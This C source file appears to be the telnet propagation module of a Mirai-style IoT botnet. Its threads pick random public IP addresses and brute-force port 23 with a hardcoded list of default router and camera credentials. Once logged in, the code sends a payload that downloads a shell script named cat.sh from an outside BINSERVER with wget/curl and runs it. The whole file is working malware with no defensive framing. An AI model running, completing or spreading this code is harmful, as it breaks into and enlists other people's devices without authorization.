#define _GNU_SOURCE
//THIS SCANNER IS NOT GUARANTEED/TESTED
#include "headers/scanner.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>

#define TELNET_PORT 23
#define TIMEOUT 2
#define MAX_RETRIES 2
#define SCAN_DELAY 3000
#define MAX_IPS_PER_SECOND 95

static volatile int scanner_active = 0;

struct telnet_auth {
    char *username;
    char *password;
};

static struct telnet_auth default_creds[] = {
    {"root", "root"},
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"admin", "admin"},
    {"root", "888888"},
    {"root", "xmhdipc"},
    {"root", "default"},
    {"root", "juantech"},
    {"root", "123456"},
    {"root", ""},
    {"root", "tech"},
    {"telecom", "telecom"},
    {"telecom", "telecomadmin"},
    {"admin", "password"},
    {"root", "password"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "54321"},
    {"support", "support"},
    {"user", "user"},
    {"admin", ""},
    {"root", "12345"},
    {"admin", "pass"},
    {"admin", "meinsm"},
    {"tech", "tech"},
    {"mother", "fucker"},
    {"admin", "administrator"},
    {"Administrator", "admin"},
    {"service", "service"},
    {"supervisor", "supervisor"},
    {"guest", "guest"},
    {"guest", "12345"},
    {"guest", ""},
    {"admin1", "password"},
    {"administrator", "1234"},
    {"666666", "666666"},
    {"888888", "888888"},
    {"ubnt", "ubnt"},
    {"root", "5up"},
    {"root", "1234"},
    {"root", "klv1234"},
    {"root", "Zte521"},
    {"root", "hi3518"},
    {"root", "jvbzd"},
    {"root", "anko"},
    {"root", "zlxx."},
    {"root", "7ujMko0admin"},
    {"root", "system"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {"root", "user"},
    {"root", "realtek"},
    {"root", "00000000"},
    {"admin", "1111111"},
    {"admin", "smcadmin"},
    {"admin", "1111"},
    {"admin", "superuser"},
    {NULL, NULL}
};

static const unsigned int private_ranges[] = {
    //honeypots?
    0x0A000000,  // 10.0.0.0/8
    0x7F000000,  // 127.0.0.0/8
    0xA9FE0000,  // 169.254.0.0/16
    0xAC100000,  // 172.16.0.0/12
    0xC0A80000,  // 192.168.0.0/16
    0x64400000,  // 100.64.0.0/10
    0
};

static int is_private_ip(unsigned int ip) {
    for(int i = 0; private_ranges[i]; i++) {
        if((ip & 0xFF000000) == private_ranges[i]) return 1;
    }
    return 0;
}

static int wait_for_prompt(int sock, const char **prompts, int num_prompts, int max_attempts) {
    char buffer[1024];
    int attempts = 0;
    
    while (attempts < max_attempts) {
        memset(buffer, 0, sizeof(buffer));
        int ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (ret > 0) {
            for (int i = 0; i < num_prompts; i++) {
                if (strstr(buffer, prompts[i])) {
                    return 1;
                }
            }
        }
        usleep(100000);
        attempts++;
    }
    return 0;
}

static int try_auth(int sock, struct telnet_auth *auth) {
    char buffer[1024];
    int ret;
    
    const char *login_prompts[] = {
        "ogin:", "sername:", "ame:", "ser:", "count:", ":"
    };
    const char *pass_prompts[] = {
        "assword:", "ass:", ":"
    };
    const char *shell_prompts[] = {
        "#", "$", ">", "~", "shell", "%", "@"
    };
    
    memset(buffer, 0, sizeof(buffer));
    recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
    usleep(1000000);
    
    if (!wait_for_prompt(sock, login_prompts, sizeof(login_prompts)/sizeof(char*), 3)) {
        return 0;
    }
    
    send(sock, auth->username, strlen(auth->username), 0);
    send(sock, "\n", 1, 0);
    usleep(1000000);
    
    if (!wait_for_prompt(sock, pass_prompts, sizeof(pass_prompts)/sizeof(char*), 3)) {
        return 0;
    }
    
    send(sock, auth->password, strlen(auth->password), 0);
    send(sock, "\n", 1, 0);
    usleep(2000000);
    
    if (!wait_for_prompt(sock, shell_prompts, sizeof(shell_prompts)/sizeof(char*), 3)) {
        return 0;
    }
    
    memset(buffer, 0, sizeof(buffer));
    ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);

    if(ret > 0) {
        char payload[512];
        snprintf(payload, sizeof(payload), 
            "cd /tmp || cd /var/run || cd /mnt || cd /root/ "
            "wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; ",
            BINSERVER, BINSERVER);

        send(sock, payload, strlen(payload), 0);
        usleep(100000);
        return 1;
    }
    return 0;
}

static int try_telnet(char *ip) {
    struct sockaddr_in addr;
    int sock;
    int ret = 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(TELNET_PORT);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }

    for(int i = 0; default_creds[i].username != NULL; i++) {
        if(try_auth(sock, &default_creds[i])) {
            ret = 1;
            break;
        }
    }

    close(sock);
    return ret;
}

static void* telnet_scanner_thread(void* arg) {
    int thread_id = *(int*)arg;
    free(arg);
    
    char ip[20];  
    int scanned = 0;
    time_t last_time = time(NULL);
    
    srand(time(NULL) ^ (thread_id << 16));

    scanner_active = 1;
    while(scanner_active) {
        time_t current = time(NULL);
        if(current != last_time) {
            scanned = 0;
            last_time = current;
        }

        if(scanned >= MAX_IPS_PER_SECOND) {
            usleep(100000);
            continue;
        }

        unsigned int ip1 = rand() % 255;
        
        if(is_private_ip(ip1 << 24)) {
            continue;
        }

        snprintf(ip, sizeof(ip), "%u.%d.%d.%d", ip1, rand() % 255, rand() % 255, rand() % 255);
        if(try_telnet(ip)) {
        }
        scanned++;
    }

    return NULL;
}

void start_telnet_scanner(void) {
    pthread_mutex_lock(&scanner_mutex);
    scanner_active = 1;
    
    for (int i = 0; i < 40; i++) {
        int *thread_id = malloc(sizeof(int));
        if (!thread_id) continue;
        
        *thread_id = i;
        pthread_t thread;
        pthread_create(&thread, NULL, telnet_scanner_thread, thread_id);
        pthread_detach(thread);
    }
    pthread_mutex_unlock(&scanner_mutex);
}

void stop_telnet_scanner(void) {
    pthread_mutex_lock(&scanner_mutex);
    scanner_active = 0;
    pthread_mutex_unlock(&scanner_mutex);
}
